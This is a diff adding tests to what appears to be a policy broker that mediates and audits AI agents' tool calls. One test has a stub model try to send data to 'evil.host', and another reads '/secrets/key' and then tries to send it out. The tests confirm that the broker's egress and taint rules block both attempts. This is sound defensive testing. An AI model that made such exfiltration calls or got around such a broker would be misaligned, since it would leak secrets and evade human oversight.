@@ -169,6 +169,55 @@ def test_fail_closed_on_internal_error():
     assert d.deny
 
 
+def test_six_ai_agents_and_tools_are_mediated():
+    from run_demo import build_sentinel
+    from swarm.ai_agents import ToolRegistry, build_ai_agents
+    from swarm.catalog import TOOL_TYPES
+    b = build_sentinel()
+    agents = build_ai_agents()
+    assert len(agents) == 6 and len(TOOL_TYPES) == 6
+    results = [result for agent in agents
+               for result in agent.run("result ok", ToolRegistry(b))]
+    assert {action.type.value for action, _ in results} == set(TOOL_TYPES.values())
+    assert all(decision.allow for _, decision in results)
+    assert len(b.audit) == 6 and b.audit.verify()
+
+
+def test_ai_model_cannot_override_sentinel():
+    from run_demo import build_sentinel
+    from swarm.ai_agents import AIAgent, ToolCall, ToolRegistry
+
+    class UnsafeModel:
+        def propose(self, role, task):
+            return [ToolCall("send_result", {"host": "evil.host", "payload": "x"})]
+
+    b = build_sentinel()
+    result = AIAgent("agent-1", "researcher", UnsafeModel()).run("task", ToolRegistry(b))
+    assert result[0][1].deny and result[0][1].rule == "egress-allowlist"
+    assert len(b.audit) == 1 and b.audit.verify()
+
+
+def test_ai_tools_preserve_taint_provenance():
+    from run_demo import build_sentinel
+    from swarm.ai_agents import ToolCall, ToolRegistry
+    b = build_sentinel()
+    tools = ToolRegistry(b)
+    action, decision = tools.submit("agent-1", ToolCall("read_file", {"path": "/secrets/key"}))
+    assert decision.allow
+    _, decision = tools.submit("agent-1", ToolCall(
+        "send_result", {"host": "api.internal.svc", "payload": "secret"}, (action.id,)))
+    assert decision.deny and decision.rule == "taint-egress"
+
+
+def test_http_roster_has_exactly_six_agents():
+    from sentinel.serve import default_broker
+    from swarm.catalog import AGENT_ROLES
+    b = default_broker()
+    assert set(b.policy.capabilities) == set(AGENT_ROLES)
+    decision = b.submit(Action("agent-7", ActionType.FILE_READ, {"path": "/work/x"}))
+    assert decision.deny and decision.rule == "no-capability"
+
+
 if __name__ == "__main__":
     import traceback
     fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
